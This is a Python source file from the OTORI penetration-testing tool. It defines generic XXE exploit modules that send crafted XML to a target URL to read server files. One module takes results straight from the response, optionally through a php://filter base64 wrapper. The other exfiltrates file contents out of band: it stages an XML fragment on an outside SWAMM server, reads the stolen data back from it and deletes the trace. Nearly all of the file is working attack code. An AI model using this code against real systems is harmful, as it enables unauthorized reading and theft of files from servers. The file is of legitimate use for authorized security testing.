#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import json
import os
import random
import re
import sys
import urllib

import libdeceitfulhttp
import libfileio
import liboutput
import libxxeexploits

# parent class for all generic XXE exploit modules
# is not actually instantiated on its own
class XXEGeneric(libxxeexploits.XXEHTTP):
	def __init__(self, uid, name):
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.SupportsDirectoryListings = True
		self.AddNextOption('TemplateRequestFile', 'A text file containing the template for each request to the target (e.g. /home/blincoln/xxe_request.txt) - see the documentation for more details', None, True)
		self.AddNextOption('TargetURL', 'The full URL to which each request should be sent (e.g. http://solrtarget.vuln.local/solr/analysis/document) - see the documentation for more details', None, True)
		if (self.CookieString):
			self.LogWarning('A cookie ("{0}") was explicitly specified on the command-line. The generic XXE modules obtain any necessary cookie values from the template request file, so the value from the command-line will be ignored. If your requests fail, please make sure the template file contains the correct cookie values.'.format(self.CookieString))

	def AddTagNameOptions(self):
		self.AddNextOption('DocTypeTagName', 'Manually define the XML doc type used in the XXE exploit definition - not usually required - will be randomly generated if not explicitly specified', None, False)
		self.AddNextOption('ElementTagName', 'Manually define the element tag name used in the XXE exploit definition - not usually required - will be randomly generated if not explicitly specified', None, False)
			
	def SetDocTypeTagName(self, tagName, messageVariables):
		if ((tagName) and (tagName.strip() != "")):
			messageVariables['%DOCTYPE%'] = tagName
			self.LogDebug('Set XML doc type to "{0}"'.format(tagName))
			#self.LogWarning('Set XML doc type to "{0}"'.format(tagName))
		else:
			self.LogDebug('Using default XML doc type of "{0}"'.format(messageVariables['%DOCTYPE%']))
			#self.LogWarning('Using default XML doc type of "{0}"'.format(messageVariables['%DOCTYPE%']))
		
	def SetElementTagName(self, tagName, messageVariables):
		if ((tagName) and (tagName.strip() != "")):
			messageVariables['%ELEMENT%'] = tagName
			self.LogDebug('Set element tag name to "{0}"'.format(tagName))
			#self.LogWarning('Set element tag name to "{0}"'.format(tagName))
		else:
			self.LogDebug('Using default element tag name of "{0}"'.format(messageVariables['%ELEMENT%']))
			#self.LogWarning('Using default element tag name of "{0}"'.format(messageVariables['%ELEMENT%']))
		
# Generic XXE - Basic request with results in body of response
class XXEGenericBasic(XXEGeneric):
	def __init__(self):
		uid = "G-XXE-Basic"
		name = "Generic XXE exploit - single request with results in body of response"
		XXEGeneric.__init__(self, uid, name)
		self.AddNextOption('Base64EncodeResults', 'Enable base-64 encoding of results by the target system, so that binary content can be returned - will *only* work if the target is PHP-based', 'false', False)
		self.AddTagNameOptions();
		
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'TemplateRequestFile', 0)
		self.SetRequiredParameter(args, 'TargetURL', 1)
		self.SetOptionalParameter(args, 'Base64EncodeResults', 2)
		self.SetOptionalParameter(args, 'DocTypeTagName', 3)
		self.SetOptionalParameter(args, 'ElementTagName', 4)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		#rawRequestTemplate = libfileio.FileReader.getFileAsString(self.GetOptionByName('TemplateRequestFile').CurrentValue)
		#templateRequest = libdeceitfulhttp.HTTPRequest.FromRawTCPMessage(rawRequestTemplate)
		templateRequest = self.GetTemplateHTTPRequestFromFile(self.GetOptionByName('TemplateRequestFile').CurrentValue)
		
		b64results = self.GetOptionByName('Base64EncodeResults').CurrentValue
		b64results = b64results.lower().strip()
		
		base64encodeResults = False
		if ((b64results != 'false') and (b64results.strip() != '')):
			base64encodeResults = True
			self.SupportsDirectoryListings = False
			if (isSystemEntity):
				messageVariables['%XXETARGET%'] = 'php://filter/read=convert.base64-encode/resource={0}'.format(messageVariables['%XXETARGET%'])

		self.SetDocTypeTagName(self.GetOptionByName('DocTypeTagName').CurrentValue, messageVariables)
		self.SetElementTagName(self.GetOptionByName('ElementTagName').CurrentValue, messageVariables)

		xxexmlmessage = templateRequest.Body
		
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)

		response = self.SendRequest(templateRequest.HTTPMethod, self.GetOptionByName('TargetURL').CurrentValue, xxexmlmessage, templateRequest.Headers)
		if (base64encodeResults):
			result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsPHP(), base64DecodeBody = True)
		else:
			result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsJava())
		return result
		

# Generic XXE - Yunusov-Osipov-style out-of-band data retrieval using She Wore A Mirrored Mask
class XXEGenericYunusovOsipov(XXEGeneric):
	def __init__(self):
		uid = "G-XXE-YO"
		name = "Generic XXE exploit - single request with results obtained via Yunusov-Osipov out-of-band data retrieval - will *only* work against PHP-based targets"
		XXEGeneric.__init__(self, uid, name)
		self.AddTagNameOptions();
		self.SupportsDirectoryListings = False
		self.RequiresSWAMM = True
		
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'TemplateRequestFile', 0)
		self.SetRequiredParameter(args, 'TargetURL', 1)
		self.SetOptionalParameter(args, 'DocTypeTagName', 2)
		self.SetOptionalParameter(args, 'ElementTagName', 3)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		#rawRequestTemplate = libfileio.FileReader.getFileAsString(self.GetOptionByName('TemplateRequestFile').CurrentValue)
		#templateRequest = libdeceitfulhttp.HTTPRequest.FromRawTCPMessage(rawRequestTemplate)
		templateRequest = self.GetTemplateHTTPRequestFromFile(self.GetOptionByName('TemplateRequestFile').CurrentValue)
		
		if (isSystemEntity):
			messageVariables['%XXETARGET%'] = 'php://filter/read=convert.base64-encode/resource={0}'.format(messageVariables['%XXETARGET%'])

		self.SetDocTypeTagName(self.GetOptionByName('DocTypeTagName').CurrentValue, messageVariables)
		self.SetElementTagName(self.GetOptionByName('ElementTagName').CurrentValue, messageVariables)

		reflectedFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedXMLFileName)
		self.LogDebug('Using SWAMM URI stem "{0}" to stage Yunusov-Osipov XML fragment - full URL will be "{1}"'.format(self.SWAMMReflectedXMLFileName, reflectedFullURL))
		messageVariables['%SWAMMSTOREDREQUESTID%'] = self.SWAMMReflectedXMLFileName
		
		xmlFragTemplate = self.GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock()
		xmlFrag = self.ActualizeTemplate(xmlFragTemplate, messageVariables)
		
		xmlFragResponse = libdeceitfulhttp.HTTPResponse()
		xmlFragResponse.ResponseCode = 200
		xmlFragResponse.ResponseReason = "OK"
		xmlFragResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xmlFragResponse.Body = xmlFrag
		
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)

		messageVariables['%YUNUSOVOSIPOVBLOCK%'] = self.GetYunusovOsipovType2MainXXEDefinitionTemplateBlock()
		
		xxexmlmessage = templateRequest.Body
		
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)

		response1 = self.SendRequest(templateRequest.HTTPMethod, self.GetOptionByName('TargetURL').CurrentValue, xxexmlmessage, templateRequest.Headers)
		
		# retrieve the OOB data from SWAMM
		httpHeaders = self.GetStandardHTTPHeaders()
		
		targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
		self.LogDebug('Target URL for out-of-band read is "{0}"'.format(targetURL))
		response2 = self.SendRequest("GET", targetURL, None, httpHeaders)
		
		if (response2.ResponseCode != 200):
			self.LogWarning('Got a response code of {0} instead of 200 when trying to read the data for "{1}" from SWAMM'.format(response2.ResponseCode, messageVariables['%XXETARGET%']))
			result = self.ParseDelimitedResponse(messageVariables, response1, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)
			return result
		else:
			result = self.ParseDelimitedResponse(messageVariables, response2, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)

			# delete the OOB data now that it's been retrieved
			targetURL = '{0}{1}'.format(self.SWAMMURLs.DeleteURL, self.SWAMMReceiverID)
			self.LogDebug('Target URL for out-of-band data delete is "{0}"'.format(targetURL))
			response3 = self.SendRequest("GET", targetURL, None, httpHeaders)
			
			# double-check to make sure it's really deleted
			targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
			self.LogDebug('Target URL for OOB read is "{0}"'.format(targetURL))
			response2 = self.SendRequest("GET", targetURL, None, httpHeaders)
			
			if (response2.ResponseCode == 404):
				self.LogDebug('Out-of-band data was successfully deleted from the SWAMM instance')
			else:
				self.LogWarning('The out-of-band data at "{0}" was not successfully deleted from the SWAMM instance - there is a small chance that this may cause inaccurate results for other files downloaded during this session'.format(self.SWAMMURLs.ReadURL))
			return result
		
		return result